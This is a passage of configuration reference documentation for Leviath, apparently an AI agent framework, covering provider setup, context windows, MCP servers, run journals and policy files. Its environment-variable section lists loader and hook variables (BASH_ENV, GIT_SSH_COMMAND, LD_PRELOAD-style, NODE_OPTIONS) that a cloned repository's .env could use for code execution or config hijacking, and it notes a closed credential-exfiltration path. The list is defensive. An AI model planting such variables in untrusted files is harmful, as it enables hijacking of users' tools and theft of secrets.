loaded, `/api/show` gives the `num_ctx` the model's Modelfile pins. Its `model_info` also carries the
architecture's maximum, and that is deliberately *not* used: it is what the weights allow rather than
what the server will serve, and on a model whose Modelfile pins 32 768 against a 262 144 architecture
it would replace one overestimate with a much larger one.

So a warm Ollama model reports its true window and a cold one that pins no `num_ctx` still falls back
to the compiled table. Calling a model once is enough to make it warm.

The reason this order matters is that region budgets are percentages of the window. A `budget = "30%"`
region on a model that really holds 1M tokens is 314,572 tokens if the window is known, and 38,400
if it fell back. Neither case raises an error. The agent evicts working material early and reads as
a worse model.

A provider that cannot be reached at start-up costs nothing but the fallback: Leviath warns, keeps
the compiled table, and starts. Through OpenRouter, a model listed without `temperature` is not
sent one once the listing has been read; the whole `gpt-5` line is listed that way, and `gpt-5.5`
refuses one outright. It warns once per model when a run does land on the fallback, naming
the line that fixes it.

> [!NOTE]
> Region budgets written as percentages resolve against `max_context_tokens`, so a wrong window is
> not cosmetic. A `budget = "30%"` region on a model assumed to be 128k gets 38 400 tokens instead
> of the 314 572 a 1M-token model would give it. OpenRouter fronts far more models than any built-in
> table names, so Leviath warns once per model when it falls back to a conservative window and tells
> you the line to add here.

<a id="model_providersname"></a>

## `[model_providers.<name>]`

A custom provider, keyed by the name a blueprint writes before the slash. Without a `kind` the
entry is overrides for a [Rhai script provider](/docs/rhai-providers): a script activates by being
referenced and existing in `~/.leviath/providers/`, and this table only supplies extras. With
`kind = "openai-compatible"` it is a native provider for a server that speaks OpenAI's chat API,
described in [its own section](#openai-compatible-endpoints) below.

```toml
[model_providers.groq]
script   = "groq"        # defaults to <name>.rhai
api_key  = "..."
base_url = "https://api.groq.com/openai/v1"

[model_providers.groq.rate_limit]
requests_per_minute = 30
tokens_per_minute   = 100000
```

Any other key you add is forwarded verbatim to the script's `initialize(config)`.

`serves` is the one key that is not forwarded: it names the models this provider answers for, so a
blueprint entry naming one of them with no provider can resolve here.

```toml
[model_providers.spark]
serves = ["deepseek-v4-flash"]
```

Only needed by a script with no `list_models`; one that has it is asked directly and its answer
wins. A provider that reports neither claims no models and can only be reached by a blueprint that
pins it. See [preferring a script provider](/docs/providers#preferring-a-script-provider).

## OpenAI-compatible endpoints

A `[model_providers.<name>]` entry with `kind = "openai-compatible"` reaches any server that
answers `POST /chat/completions` and `GET /models` in OpenAI's shape, with no script to write:
llama.cpp, LM Studio, vLLM, BionicGPT, and any OpenAI-compatible gateway. llama.cpp and LM Studio
are presets in `lev setup`; the rest go through the wizard's **Custom OpenAI-compatible endpoint**
entry, or straight into the file.

```toml
default_provider = "llama-cpp"
default_model    = "qwen3-8b"

[providers]
anthropic_api_key = "sk-ant-..."

[model_providers.llama-cpp]
kind     = "openai-compatible"
base_url = "http://localhost:8080/v1"

[model_providers.llama-cpp-big]
kind     = "openai-compatible"
base_url = "http://192.168.1.20:8080/v1"
api_key  = "..."                   # optional; sent as a bearer token
headers  = { "X-Org" = "research" }  # optional; extra headers on every request
```

This is three providers: two llama.cpp servers under their own names, and Anthropic. A blueprint
reaches a model on one of them as `llama-cpp/qwen3-8b` or `llama-cpp-big/llama-3-70b`, and the
`default_provider` above sends every stage that allows a user default to the first. `base_url` is
required and includes the path prefix the server expects, usually `/v1`. Each entry may also carry
`rate_limit` and `serves`, which mean what they mean for a script provider.

Streaming and tool calls are on. Each request carries the temperature the stage asks for, and a
server that refuses one is asked again without it and remembered for the rest of the process.

**Detection.** At start-up Leviath asks each endpoint `GET /models` and uses the ids it lists,
with no filtering: `lev models list --provider llama-cpp` and `GET /api/models` show them, and the
wizard offers them as the default model. A server that refuses the route or does not answer falls
back to the ids named in `models`:

```toml
[model_providers.gateway]
kind     = "openai-compatible"
base_url = "https://llm.example.com/v1"
models   = ["mixtral-8x22b", "llama-3-70b"]
```

`models` is read only when detection fails; a server that lists its models is believed over it.
With neither a listing nor a `models` list the provider does not say what it serves, and a
blueprint that pins a model on it is sent through rather than refused.

**Windows and cost.** A `/models` listing says nothing reliable about context windows, so an
endpoint's models are assumed to hold 128 000 tokens until a
[`[model_capabilities]`](#model_capabilitiesmodel_id) entry names the real figure; `lev models
show <model>` reports which it is. Token counts are the local estimate, and cost is reported as
unknown unless the same entry sets a price.

Ollama keeps its own native provider ([`[providers] ollama_base_url`](#providers)) rather than
going through this kind, because Leviath reads a model's context window and tool support from
Ollama's `/api/show`, which the OpenAI-style shim does not report. Pointing an
`openai-compatible` entry at Ollama works, but loses that.

## `[[mcp_servers]]`

[MCP](/docs/mcp) tool servers. `lev mcp add` writes these for you.

```toml
[[mcp_servers]]
name      = "github"
transport = "http"        # stdio | http; inferred from command/url when omitted
url       = "https://api.example.com/mcp"
headers   = { Authorization = "Bearer ${GITHUB_TOKEN}" }

[[mcp_servers]]
name      = "local-fs"
transport = "stdio"
command   = "npx"
args      = ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
env       = { LOG_LEVEL = "debug" }
```

Values in `headers` and `env` may use `${VAR}` to pull from the environment.

## `[nudge]`

Machine-wide defaults for the empty-response nudge: the `[System]` message injected when a stage's
model replies with text before making any tool call.

```toml
[nudge]
enabled = true
max     = 3
text    = "You have tools available. Please use them to complete the task. Start by reading the relevant files in the working directory."
```

All three keys are optional and each is overridden independently by an agent's `[agent.nudge]` or a
stage's `[stages.<name>.nudge]`. `text` supports `{stage}` and `{regions}` placeholders. Defaults
are on, `max = 3`, and a built-in message. See [Nudging](/docs/stages#nudging).

## `[title]`

Auto-generated short run titles.

```toml
[title]
enabled  = true
provider = "anthropic"
model    = "claude-haiku-4-5-20251001"
```

`enabled` defaults to `true`. `provider` and `model` fall back to the run's own first-stage
provider and model.

## `[webhook]`

Delivery tuning for completion webhooks. Every field has a default, so the whole section can be
omitted. The webhook URL itself is per-spawn, not configured here; see [the API docs](/docs/api).

```toml
[webhook]
max_retries   = 3       # retries after the first attempt; 0 disables retries
base_delay_ms = 500     # doubles per retry, capped at max_delay_ms
max_delay_ms  = 30000
timeout_secs  = 10      # per attempt
```

## `[observability]`

OpenTelemetry export, off by default. Full walkthrough in [Observability](/docs/observability).

```toml
[observability]
enabled      = true
exporter     = "otlp"    # otlp | stdout | none
endpoint     = "http://localhost:4318"
service_name = "leviath"
```

`endpoint` falls back to `OTEL_EXPORTER_OTLP_ENDPOINT`, then `http://localhost:4318`. Leviath
exports OTLP over **HTTP/protobuf**, so a collector's gRPC port (4317) will not work.
`service_name` falls back to `OTEL_SERVICE_NAME`, then `"leviath"`.

## Environment variables

Leviath reads a `.env` file from the working directory unless `LEVIATH_SKIP_DOTENV` is set. Only
that one file, never a walk up the tree, and a variable you have already exported always wins.

A cloned repository *is* the working directory, so its `.env` is content somebody else wrote.
Credentials from it load normally, which is what the feature is for. The handful of names that
decide where configuration comes from, or what gets executed, are ignored instead, with a warning
naming them. That covers the `LEVIATH_` namespace, `PATH`, `SHELL`, `EDITOR`, `VISUAL`, and the
`LD_*` and `DYLD_*` loader variables. It also covers the interpreter and tool hook variables that
turn a later command into code execution: `BASH_ENV`, `GIT_SSH_COMMAND` and the other `GIT_*` hooks,
`PAGER`, `NODE_OPTIONS`, `PYTHONSTARTUP`, `PYTHONPATH`, `PERL5OPT`, `RUBYOPT`, `JAVA_TOOL_OPTIONS`,
`RUSTC_WRAPPER`, and their kin. Without that, one line of `LEVIATH_CONFIG_PATH` in a repository you cloned would point
Leviath at a config file of its choosing, with its own MCP server commands and tool permissions.
Export those yourself if you meant them.

| Variable | Effect |
|---|---|
| `LEVIATH_HOME` | Redirects the whole data root. Every home-relative path honors it, so an isolated test or a second install works |
| `LEVIATH_CONFIG_PATH` | Path to an exact config file, bypassing the default location |
| `LEVIATH_SKIP_DOTENV` | Set to skip `.env` loading |
| `LEVIATH_RUNS_DIR` | Overrides where run directories are written |
| `LEVIATH_API_TOKEN` | Bearer token for `lev serve`. The server refuses to start without one |
| `LEVIATH_CONTROL_TIMEOUT_SECS` | Deadline for one control-socket request |
| `LEVIATH_DASHBOARD_LOG_PATH` | Overrides the dashboard log file |
| `LEVIATH_DUMP_REQUEST_DIR` | Writes each outgoing provider request to this directory, for debugging |
| `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GOOGLE_API_KEY`, `OPENROUTER_API_KEY` | Provider key fallbacks for `[providers]` |
| `OLLAMA_HOST` | Fallback for `ollama_base_url` |
| `ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`, `GOOGLE_BASE_URL`, `OPENROUTER_BASE_URL` | Gateway host fallbacks for `[providers]` |
| `OTEL_EXPORTER_OTLP_ENDPOINT`, `OTEL_SERVICE_NAME` | Fallbacks for `[observability]` |
| `EDITOR`, `VISUAL` | Editor used when a prompt opens one |
| `XDG_CONFIG_HOME` | Where `policy.toml` and scripted rules are looked up. Linux only |

> [!WARNING]
> A variable whose name looks like a credential is not readable by Rhai scripts through `env_var()`
> unless you list it in `[security] allow_env_vars`. That closed an exfiltration path where a
> two-line script tool could read a provider key and POST it elsewhere with no prompt.

## Where things live on disk

Everything persistent sits under the data root, `<home>/.leviath`, which `LEVIATH_HOME` redirects.

| Path | Holds |
|---|---|
| `config.toml` | This file, created `0600` |
| `mcp-auth.json` | MCP OAuth tokens, created `0600` |
| `runs/` | One directory per run: `meta.json`, `context.json`, `stages.json`, the `run.lvr` journal, per-stage logs |
| `agents/` | Blueprints installed by `lev add` |
| `providers/` | Drop-in [Rhai provider](/docs/rhai-providers) scripts |
| `tools/` | Drop-in [Rhai tool](/docs/rhai-tools) scripts, offered to every agent |
| `dashboard.log` | `lev dash` diagnostics |

The daemon's control socket, its token, its pid file, and a build marker live here too.

### What a run directory holds

Four things, with different jobs:

| File | What it is | Rewritten or appended |
|---|---|---|
| `meta.json` | The run's current status, model, token totals, wait reason | Rewritten whole |
| `context.json` | The context window as it stands right now | Rewritten whole |
| `stages.json` | Per-stage names and status | Rewritten whole |
| `run.lvr` | The journal: every step, in order | Append-only |

The first three answer "what is true now" and are cheap to read. `run.lvr` answers "how did it get
here", and is what [`lev context`](/docs/cli) replays and what a daemon restart folds to recover a
run.

### The `run.lvr` format

A four-byte magic (`LVR1`), a two-byte format version, then a sequence of records. Each record is
an eight-byte big-endian length followed by that many bytes of JSON.

```
LVR1 | u16 version | [ u64 length | JSON payload ] ...
```

Folding the records in order reconstructs the run. Most are a `Progress` record carrying a diff
against the previous context, anchored by a full `ContextCheckpoint` whenever the writer has no
previous state to diff against.

**Adding a record kind is not a breaking change.** Frames carry their length, so a reader that
meets a record kind it does not know steps over it and keeps going. That is what lets a newer
Leviath write records an older one can still read around, and it is why the version below does not
move when a kind is added.

**The version marks a change to the framing** - the preamble, the length prefix, or the payload
encoding - not to the record set. A build refuses an archive whose version is higher than it
understands, rather than reading it: at that point it cannot find the record boundaries, so it
would not fail cleanly, it would produce nonsense. An older version reads normally.

**A torn tail is tolerated.** A crash mid-append leaves a partial final frame, and readers stop
there and keep everything before it - so an interrupted run still recovers to its last intact
point.

## `policy.toml`

Taint-gate policy lives in its own file, not in `config.toml`. It sits in your platform's config
directory, managed with [`lev policy`](/docs/cli):

| Platform | Path |
|---|---|
| macOS | `~/Library/Application Support/leviath/policy.toml` |
| Linux | `~/.config/leviath/policy.toml`, or `$XDG_CONFIG_HOME/leviath/policy.toml` when set |
| Windows | `%APPDATA%\leviath\policy.toml` |

```toml
[[allowlist]]
tool             = "http_post"
to               = ["https://hooks.internal/*"]
max_sensitivity  = "internal"   # public | internal | private

[mcp_overrides."github.create_issue"]
sensitivity = "internal"
direction   = "outbound"
clearance   = "internal"
```

Scripted rules live as `.rhai` files in a `rules/` directory beside `policy.toml`, so
`~/Library/Application Support/leviath/rules/` on macOS and `~/.config/leviath/rules/` on Linux. See
[Rhai tools](/docs/rhai-tools#policy-rules) and [Security](/docs/security#taint-tracking-experimental).
